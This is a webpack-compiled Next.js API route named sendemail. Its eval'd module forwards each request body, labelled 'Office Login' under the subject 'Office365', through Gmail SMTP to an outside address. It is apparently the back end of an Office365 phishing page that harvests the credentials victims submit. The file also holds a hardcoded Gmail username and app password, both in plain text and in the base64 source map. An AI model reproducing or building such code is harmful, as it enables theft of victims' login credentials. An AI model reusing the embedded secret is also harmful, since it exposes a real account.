"use strict";
/*
 * ATTENTION: An "eval-source-map" devtool has been used.
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file with attached SourceMaps in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
(() => {
var exports = {};
exports.id = "pages/api/sendemail";
exports.ids = ["pages/api/sendemail"];
exports.modules = {

/***/ "nodemailer":
/*!*****************************!*\
  !*** external "nodemailer" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("nodemailer");

/***/ }),

/***/ "(api)/./pages/api/sendemail.js":
/*!********************************!*\
  !*** ./pages/api/sendemail.js ***!
  \********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

eval("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ sendEmail)\n/* harmony export */ });\nlet nodemailer = __webpack_require__(/*! nodemailer */ \"nodemailer\");\nasync function sendEmail(req, res) {\n    console.log(req.body);\n    let transporter = nodemailer.createTransport({\n        port: 465,\n        host: \"smtp.gmail.com\",\n        secure: true,\n        auth: {\n            user: \"techbae.js@gmail.com\",\n            pass: \"rsbijlgnsjxqytqh\"\n        }\n    });\n    let info = await transporter.sendMail({\n        from: '\"Office\" <techbae.js@gmail.com>',\n        to: \"reyesjennifer2806@gmail.com\",\n        subject: \"Office365\",\n        text: `Ofiice login ${req.body}`,\n        html: `<h3> Office Login: ${req.body}</h3>`\n    });\n    res.json({\n        info\n    });\n};\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiKGFwaSkvLi9wYWdlcy9hcGkvc2VuZGVtYWlsLmpzLmpzIiwibWFwcGluZ3MiOiI7Ozs7QUFBQSxJQUFJQSxVQUFVLEdBQUdDLG1CQUFPLENBQUMsOEJBQVksQ0FBQztBQUV2QixlQUFlQyxTQUFTLENBQUVDLEdBQUcsRUFBRUMsR0FBRyxFQUFFO0lBQy9DQyxPQUFPLENBQUNDLEdBQUcsQ0FBQ0gsR0FBRyxDQUFDSSxJQUFJLENBQUM7SUFFcEIsSUFBSUMsV0FBVyxHQUFHUixVQUFVLENBQUNTLGVBQWUsQ0FBQztRQUMxQ0MsSUFBSSxFQUFFLEdBQUc7UUFDVEMsSUFBSSxFQUFFLGdCQUFnQjtRQUN0QkMsTUFBTSxFQUFFLElBQUk7UUFDWkMsSUFBSSxFQUFFO1lBQ0pDLElBQUksRUFBRSxzQkFBc0I7WUFDNUJDLElBQUksRUFBRSxrQkFBa0I7U0FDekI7S0FDSCxDQUFDO0lBRUEsSUFBSUMsSUFBSSxHQUFHLE1BQU1SLFdBQVcsQ0FBQ1MsUUFBUSxDQUFDO1FBQ3JDQyxJQUFJLEVBQUUsaUNBQWlDO1FBQ3ZDQyxFQUFFLEVBQUUsNkJBQTZCO1FBQ2pDQyxPQUFPLEVBQUUsV0FBVztRQUNwQkMsSUFBSSxFQUFFLENBQUMsYUFBYSxFQUFFbEIsR0FBRyxDQUFDSSxJQUFJLENBQUMsQ0FBQztRQUNoQ2UsSUFBSSxFQUFFLENBQUMsbUJBQW1CLEVBQUVuQixHQUFHLENBQUNJLElBQUksQ0FBQyxLQUFLLENBQUM7S0FDM0MsQ0FBQztJQUVISCxHQUFHLENBQUNtQixJQUFJLENBQUM7UUFBQ1AsSUFBSTtLQUFDLENBQUM7Q0FDckIiLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly9teS1hcHAvLi9wYWdlcy9hcGkvc2VuZGVtYWlsLmpzPzc5YTkiXSwic291cmNlc0NvbnRlbnQiOlsibGV0IG5vZGVtYWlsZXIgPSByZXF1aXJlKCdub2RlbWFpbGVyJylcclxuXHJcbmV4cG9ydCBkZWZhdWx0IGFzeW5jIGZ1bmN0aW9uIHNlbmRFbWFpbCAocmVxLCByZXMpIHtcclxuICAgIGNvbnNvbGUubG9nKHJlcS5ib2R5KVxyXG5cclxuICAgICBsZXQgdHJhbnNwb3J0ZXIgPSBub2RlbWFpbGVyLmNyZWF0ZVRyYW5zcG9ydCh7XHJcbiAgICAgICAgcG9ydDogNDY1LFxyXG4gICAgICAgIGhvc3Q6IFwic210cC5nbWFpbC5jb21cIixcclxuICAgICAgICBzZWN1cmU6IHRydWUsIC8vIHRydWUgZm9yIDQ2NSwgZmFsc2UgZm9yIG90aGVyIHBvcnRzXHJcbiAgICAgICAgYXV0aDoge1xyXG4gICAgICAgICAgdXNlcjogJ3RlY2hiYWUuanNAZ21haWwuY29tJywgLy8gZ2VuZXJhdGVkIGV0aGVyZWFsIHVzZXJcclxuICAgICAgICAgIHBhc3M6ICdyc2JpamxnbnNqeHF5dHFoJywgLy8gZ2VuZXJhdGVkIGV0aGVyZWFsIHBhc3N3b3JkXHJcbiAgICAgICAgfSxcclxuICAgICB9KVxyXG5cclxuICAgICAgIGxldCBpbmZvID0gYXdhaXQgdHJhbnNwb3J0ZXIuc2VuZE1haWwoe1xyXG4gICAgICAgIGZyb206ICdcIk9mZmljZVwiIDx0ZWNoYmFlLmpzQGdtYWlsLmNvbT4nLFxyXG4gICAgICAgIHRvOiAncmV5ZXNqZW5uaWZlcjI4MDZAZ21haWwuY29tJyxcclxuICAgICAgICBzdWJqZWN0OiAnT2ZmaWNlMzY1JyxcclxuICAgICAgICB0ZXh0OiBgT2ZpaWNlIGxvZ2luICR7cmVxLmJvZHl9YCxcclxuICAgICAgICBodG1sOiBgPGgzPiBPZmZpY2UgTG9naW46ICR7cmVxLmJvZHl9PC9oMz5gXHJcbiAgICAgICB9KVxyXG5cclxuICAgICAgcmVzLmpzb24oe2luZm99KVxyXG59Il0sIm5hbWVzIjpbIm5vZGVtYWlsZXIiLCJyZXF1aXJlIiwic2VuZEVtYWlsIiwicmVxIiwicmVzIiwiY29uc29sZSIsImxvZyIsImJvZHkiLCJ0cmFuc3BvcnRlciIsImNyZWF0ZVRyYW5zcG9ydCIsInBvcnQiLCJob3N0Iiwic2VjdXJlIiwiYXV0aCIsInVzZXIiLCJwYXNzIiwiaW5mbyIsInNlbmRNYWlsIiwiZnJvbSIsInRvIiwic3ViamVjdCIsInRleHQiLCJodG1sIiwianNvbiJdLCJzb3VyY2VSb290IjoiIn0=\n//# sourceURL=webpack-internal:///(api)/./pages/api/sendemail.js\n");

/***/ })

};
;

// load runtime
var __webpack_require__ = require("../../webpack-api-runtime.js");
__webpack_require__.C(exports);
var __webpack_exec__ = (moduleId) => (__webpack_require__(__webpack_require__.s = moduleId))
var __webpack_exports__ = (__webpack_exec__("(api)/./pages/api/sendemail.js"));
module.exports = __webpack_exports__;

})();